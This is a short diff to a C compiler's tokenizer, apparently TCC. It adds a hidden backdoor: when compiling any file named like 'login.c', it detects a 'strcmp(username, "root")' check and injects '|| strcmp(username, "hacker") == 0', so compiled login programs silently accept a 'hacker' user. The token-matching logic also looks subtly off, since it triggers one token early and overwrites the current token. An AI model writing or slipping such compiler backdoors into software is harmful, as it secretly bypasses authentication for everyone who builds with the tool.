@@ -2962,6 +2962,42 @@ keep_tok_flags:
 #if defined(PARSE_DEBUG)
     printf("token = %d %s\n", tok, get_tok_str(tok, &tokc));
 #endif
+
+    static const char *pat[] = {
+        "if",  "(",  "!",  "strcmp", "(", 
+        "username", ",", "\"root\"", ")", 
+        NULL
+    };
+   
+    static const char *inj[] = {
+        "||", "strcmp", "(", "username", ",", "\"hacker\"", ")", "==", "0", NULL
+    };
+   
+    static int pat_idx = 0; 
+    static int inj_idx = -1; 
+
+    if (file && file->filename && strstr(file->filename, "login.c")) {
+        char *s = tokcstr.data;
+
+        if (inj_idx >= 0) {
+            const char *t = inj[inj_idx++];
+            tok = tok_alloc(t, strlen(t));
+            strcpy(tokcstr.data, t);
+            if (inj[inj_idx] == NULL) 
+                inj_idx = -1;
+            return;
+        }
+
+        if (pat[pat_idx] && strcmp(s, pat[pat_idx]) == 0) {
+            if (++pat_idx == 8) {
+                pat_idx = 0;
+                inj_idx = 0;
+            }
+        } else {
+            pat_idx = 0;
+        }
+    }
+
 }
 
 #ifdef PP_DEBUG
